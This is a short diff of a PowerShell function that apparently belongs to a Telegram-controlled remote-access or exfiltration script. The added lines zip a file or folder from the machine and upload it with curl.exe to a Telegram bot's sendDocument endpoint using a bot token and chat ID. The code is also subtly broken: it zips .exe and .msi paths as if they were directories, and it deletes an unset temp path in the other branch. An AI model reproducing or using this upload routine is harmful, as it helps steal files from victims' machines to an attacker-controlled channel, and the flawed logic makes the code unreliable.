@@ -135,15 +135,16 @@ param ([string[]]$Path)
 if (Test-Path -Path $path){
     $extension = [System.IO.Path]::GetExtension($path)
     if ($extension -eq ".exe" -or $extension -eq ".msi") {
-        $FilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
+        $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
         Add-Type -AssemblyName System.IO.Compression.FileSystem
-        [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $FilePath)
-        sleep 1
-        Post-File; Rm -Path $FilePath -Recurse -Force
+        [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
+        curl.exe -F chat_id="$ChatID" -F document=@"$tempZipFilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
         Write-Output "File Upload Complete: $path"
+        Rm -Path $tempZipFilePath -Recurse -Force
     }else{
-        Post-File; Rm -Path $FilePath -Recurse -Force
+        curl.exe -F chat_id="$ChatID" -F document=@"$Path" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
         Write-Output "File Upload Complete: $path"
+        Rm -Path $tempZipFilePath -Recurse -Force
     }
 }else{Write-Host "File Not Found: $path"}
 }
